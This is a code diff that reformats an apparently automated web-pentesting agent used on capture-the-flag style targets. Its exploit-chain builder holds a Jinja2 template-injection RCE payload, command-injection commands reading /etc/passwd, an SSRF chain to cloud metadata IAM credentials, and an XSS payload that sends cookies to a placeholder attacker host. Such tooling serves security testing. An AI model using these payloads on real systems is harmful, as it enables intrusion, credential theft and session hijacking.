@@ -225,7 +225,7 @@ class FuzzAgent(BaseAgent):
 {self.get_scanner_state()}
 
 Endpoints to test:
-{chr(10).join(f'  - {e}' for e in endpoints)}
+{chr(10).join(f"  - {e}" for e in endpoints)}
 
 Methodology context:
 {rag}
@@ -275,7 +275,10 @@ Report all confirmed vulnerabilities with their payload, indicators, and endpoin
         for link in links:
             if link in tested_endpoints:
                 continue
-            if not any(k in link for k in ["login", "search", "api", "upload", "submit", "preview", "jobs", "admin"]):
+            if not any(
+                k in link
+                for k in ["login", "search", "api", "upload", "submit", "preview", "jobs", "admin"]
+            ):
                 continue
             tested_endpoints.add(link)
             results = self.scanner.scan_endpoint(link, method="GET", params={"q": "test"})
@@ -289,8 +292,11 @@ Report all confirmed vulnerabilities with their payload, indicators, and endpoin
 
         try:
             ssrf_results = _test_ssrf_fn(
-                endpoint, method=method, param_name=param_name,
-                scanner=self.scanner, url_suffix="#.yaml",
+                endpoint,
+                method=method,
+                param_name=param_name,
+                scanner=self.scanner,
+                url_suffix="#.yaml",
             )
             for r in ssrf_results:
                 if r.get("interesting"):
@@ -396,59 +402,69 @@ Report exploit chains with steps and expected outcomes."""
         xss = [f for f in findings if "xss" in f.get("type", "").lower()]
 
         if sqli:
-            chains.append({
-                "name": "SQLi → data exfiltration",
-                "steps": [
-                    f"SQLi at {sqli[0]['endpoint']}",
-                    "UNION SELECT to dump schema",
-                    "Extract credentials",
-                    "Login with stolen credentials",
-                ],
-            })
+            chains.append(
+                {
+                    "name": "SQLi → data exfiltration",
+                    "steps": [
+                        f"SQLi at {sqli[0]['endpoint']}",
+                        "UNION SELECT to dump schema",
+                        "Extract credentials",
+                        "Login with stolen credentials",
+                    ],
+                }
+            )
 
         if ssrf:
-            chains.append({
-                "name": "SSRF → cloud metadata → credential theft",
-                "steps": [
-                    f"SSRF at {ssrf[0]['endpoint']}",
-                    "Access 169.254.169.254 via decimal IP (2852039166)",
-                    "Get IAM credentials from /latest/meta-data/iam/security-credentials/",
-                    "Use credentials to access STS/S3/SQS",
-                ],
-            })
+            chains.append(
+                {
+                    "name": "SSRF → cloud metadata → credential theft",
+                    "steps": [
+                        f"SSRF at {ssrf[0]['endpoint']}",
+                        "Access 169.254.169.254 via decimal IP (2852039166)",
+                        "Get IAM credentials from /latest/meta-data/iam/security-credentials/",
+                        "Use credentials to access STS/S3/SQS",
+                    ],
+                }
+            )
 
         if ssti:
-            chains.append({
-                "name": "SSTI → RCE",
-                "steps": [
-                    f"SSTI at {ssti[0]['endpoint']}",
-                    "Jinja2 RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-                    "Read /etc/passwd, environment variables",
-                    "Find and read flag file",
-                ],
-            })
+            chains.append(
+                {
+                    "name": "SSTI → RCE",
+                    "steps": [
+                        f"SSTI at {ssti[0]['endpoint']}",
+                        "Jinja2 RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                        "Read /etc/passwd, environment variables",
+                        "Find and read flag file",
+                    ],
+                }
+            )
 
         if cmdi:
-            chains.append({
-                "name": "CMDi → RCE",
-                "steps": [
-                    f"Command injection at {cmdi[0]['endpoint']}",
-                    "Execute: id; whoami; cat /etc/passwd",
-                    "Enumerate filesystem: find / -name 'flag*'",
-                    "Read flag file",
-                ],
-            })
+            chains.append(
+                {
+                    "name": "CMDi → RCE",
+                    "steps": [
+                        f"Command injection at {cmdi[0]['endpoint']}",
+                        "Execute: id; whoami; cat /etc/passwd",
+                        "Enumerate filesystem: find / -name 'flag*'",
+                        "Read flag file",
+                    ],
+                }
+            )
 
         if xss:
-            chains.append({
-                "name": "XSS → session theft",
-                "steps": [
-                    f"XSS at {xss[0]['endpoint']}",
-                    "Start callback_listener.py on attacker IP",
-                    "Inject payload: <img src=x onerror='fetch(\"http://ATTACKER:8888/\"+document.cookie)'>",
-                    "Use captured session cookie for impersonation",
-                ],
-            })
+            chains.append(
+                {
+                    "name": "XSS → session theft",
+                    "steps": [
+                        f"XSS at {xss[0]['endpoint']}",
+                        "Start callback_listener.py on attacker IP",
+                        "Inject payload: <img src=x onerror='fetch(\"http://ATTACKER:8888/\"+document.cookie)'>",
+                        "Use captured session cookie for impersonation",
+                    ],
+                }
+            )
 
         result.data["chains"] = chains
         for chain in chains:
